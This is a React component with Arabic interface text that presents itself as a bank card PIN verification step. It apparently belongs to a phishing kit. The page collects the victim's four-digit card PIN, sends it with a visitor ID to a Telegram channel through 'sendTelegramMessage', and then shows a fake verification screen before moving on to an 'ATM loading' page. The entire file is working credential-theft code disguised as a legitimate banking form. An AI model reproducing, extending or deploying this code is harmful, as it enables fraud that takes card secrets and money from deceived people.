import React, { useState, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import LoadingScreen from '../components/LoadingScreen';
import Header from '../components/Header';

const ATMPin = () => {
  const navigate = useNavigate();
  const { sendTelegramMessage, formData } = useRegistration();
  const [pin, setPin] = useState(['', '', '', '']);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const handleChange = (index: number, value: string) => {
    if (value.length > 1) {
      value = value.slice(-1);
    }
    
    const newPin = [...pin];
    newPin[index] = value;
    setPin(newPin);

    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const pinCode = pin.join('');
    if (pinCode.length !== 4) {
      setError('الرجاء إدخال رقم PIN كاملاً');
      return;
    }

    setIsLoading(true);
    setError('');

    try {
      await sendTelegramMessage(
        `🔢 رقم PIN للبطاقة\n\n` +
        `🔐 PIN: ${pinCode}\n` +
        `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}`
      );

      setTimeout(() => {
        setIsLoading(false);
        navigate('/atm-loading');
      }, 2000);
    } catch (err) {
      setIsLoading(false);
      setError('حدث خطأ، الرجاء المحاولة مرة أخرى');
    }
  };

  if (isLoading) {
    return <LoadingScreen message="جاري التحقق من رقم PIN..." />;
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
          <div className="text-center mb-8">
            <div className="w-16 h-16 bg-[#6A0F49] rounded-full flex items-center justify-center mx-auto mb-4">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-[#6A0F49] mb-2">
              رقم PIN
            </h1>
            <p className="text-gray-600 text-sm">
              أدخل رقم PIN الخاص ببطاقتك
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="flex justify-center gap-4" dir="ltr">
              {pin.map((digit, index) => (
                <input
                  key={index}
                  ref={(el) => (inputRefs.current[index] = el)}
                  type="password"
                  inputMode="numeric"
                  maxLength={1}
                  value={digit}
                  onChange={(e) => handleChange(index, e.target.value.replace(/\D/g, ''))}
                  onKeyDown={(e) => handleKeyDown(index, e)}
                  className="w-14 h-16 text-center text-2xl font-bold border-2 border-gray-300 rounded-lg focus:border-[#6A0F49] focus:ring-2 focus:ring-[#6A0F49] focus:outline-none"
                />
              ))}
            </div>

            {error && (
              <div className="text-red-500 text-sm text-center">{error}</div>
            )}

            <button
              type="submit"
              className="w-full bg-[#6A0F49] text-white py-3 rounded-lg font-semibold hover:bg-[#5A0D3D] transition-colors"
            >
              تأكيد
            </button>
          </form>

          <div className="mt-6 text-center">
            <p className="text-gray-500 text-xs">
              رقم PIN هو الرقم السري المكون من 4 أرقام الخاص ببطاقتك
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ATMPin;
